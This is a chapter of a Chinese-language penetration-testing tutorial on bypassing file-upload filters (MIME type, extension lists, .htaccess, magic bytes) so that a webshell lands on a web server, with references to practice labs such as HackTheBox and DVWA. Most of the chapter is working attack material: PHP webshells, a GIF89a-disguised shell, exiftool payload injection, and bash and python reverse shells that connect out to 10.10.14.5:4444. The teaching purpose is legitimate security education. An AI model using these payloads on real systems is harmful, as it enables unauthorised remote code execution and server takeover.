# Ch 13 — 檔案上傳繞過：MIME / 副檔名 / 魔術字元

> 目標：對有檔案上傳功能的 Web 應用，掌握各種繞過過濾的方法，最終上傳可執行的 webshell。

## 為什麼檔案上傳是高危漏洞

如果你能上傳一個 PHP 檔案到 Web 伺服器能存取的位置，就能執行任意程式碼：

```
上傳 shell.php → 訪問 http://target/uploads/shell.php → RCE
```

問題是，開發者通常有各種過濾機制。你的任務是繞過它們。

## 過濾機制與繞過方法

### Level 1：前端 JavaScript 驗證

最容易繞過，JavaScript 只在瀏覽器端執行：

```
方法一：用 Burp Proxy 攔截請求，修改後發送
方法二：在瀏覽器開發者工具刪除或修改 JavaScript
方法三：用 curl 直接發 POST 請求
```

```bash
# 直接用 curl 上傳，完全繞過前端
curl -X POST http://target/upload \
    -F "file=@shell.php;type=image/jpeg"
```

### Level 2：MIME Type（Content-Type）驗證

伺服器檢查請求中的 `Content-Type`：

```
正常圖片：Content-Type: image/jpeg
你的 shell：Content-Type: application/php (預設)

繞過：在 Burp 裡修改 Content-Type
```

```
# Burp Repeater 裡修改：
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg     ← 改成這個
```

### Level 3：副檔名驗證（黑名單）

如果伺服器封鎖 `.php`，試其他 PHP 副檔名：

```
.php3, .php4, .php5, .php7
.phtml, .pht, .phar
.shtml （Apache SSI）
```

```bash
# 上傳 shell.php5 或 shell.phtml
mv shell.php shell.php5
```

大小寫也可以試：`.pHP`, `.PHP`, `.PhP`（某些 Windows 系統）

### Level 4：副檔名驗證（白名單）

只允許特定副檔名（如 `.jpg`, `.png`）。

**方法一：雙副檔名**

```
shell.php.jpg    → 某些伺服器用最後的副檔名
shell.jpg.php    → 某些伺服器用第一個
shell.php%00.jpg → Null byte 截斷（舊版 PHP）
```

**方法二：.htaccess 上傳**

如果允許上傳 `.htaccess`，可以重新定義 handler：

```apache
# 上傳這個 .htaccess
AddType application/x-httpd-php .jpg
```

然後上傳 `shell.jpg`（實際是 PHP 程式碼），它會被當成 PHP 執行。

**方法三：SSRF 或路徑穿越**

```
filename="../../../var/www/html/shell.php"
```

### Level 5：檔案內容（Magic Bytes）驗證

伺服器讀取檔案開頭幾個位元組（magic bytes）判斷類型：

```
JPEG: FF D8 FF E0
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 37 61
```

**方法：在 PHP 前面加圖片 magic bytes**

```bash
# 用 GIF Header 偽裝
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php
# 開頭是 GIF89a，通過 magic byte 檢查，但 PHP 還是會執行後面的程式碼
```

用 exiftool 把 PHP 塞進圖片 metadata：

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# 把修改後的 image.jpg 上傳
# 然後用 LFI 包含它，或找伺服器直接解析 exif
```

## 準備好用的 Webshell

```php
<?php system($_GET["cmd"]); ?>
```

存成 `shell.php`，上傳後：
```
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=whoami
```

更完整的 webshell：

```php
<?php
if(isset($_GET['cmd'])){
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>
```

## 取得反彈 Shell

確認 webshell 能跑後：

```bash
# Kali 開監聽
nc -nvlp 4444

# 在 webshell 觸發
?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'

# 如果 bash 不行試 python
?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## 找上傳後的檔案位置

上傳成功後，要找到檔案在哪：

```bash
# 猜測常見路徑
/uploads/
/images/
/files/
/media/
/static/
/user_uploads/

# 用 gobuster 找
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# 有時回應訊息會告訴你路徑
# 看 Burp 的回應，找 "File uploaded to: ..."
```

## 實戰流程

```
1. 找到檔案上傳功能
2. 先嘗試直接上傳 shell.php（看報什麼錯）
3. 根據錯誤判斷過濾機制：
   - "只允許圖片" → 改 Content-Type 或加 magic bytes
   - "不允許 .php" → 試 .php5, .phtml
   - "檔案不安全" → 試加 GIF89a magic bytes
4. 上傳成功後找到存放路徑
5. 訪問 shell，驗證 RCE
6. 取得反彈 shell
```

## 本章對應靶機

| 機器 | 上傳繞過技術 |
|------|------------|
| HTB Bashed | 不是上傳，但有直接的 phpbash webshell |
| HTB Curling | 需要登入後上傳，繞過副檔名限制 |
| THM Upload Vulnerabilities | 專門練習各種上傳繞過 |
| DVWA File Upload | 從 Low 到 High 難度的上傳繞過 |

## 自我檢核

- [ ] 知道在 Burp 中如何修改 Content-Type 繞過 MIME 檢查
- [ ] 知道除了 `.php` 外還有哪些 PHP 副檔名
- [ ] 能製作帶 GIF89a magic bytes 的 PHP shell
- [ ] 知道 `.htaccess` 上傳攻擊的原理

→ [Ch 14 命令注入（Command Injection）](./14-command-injection.md)
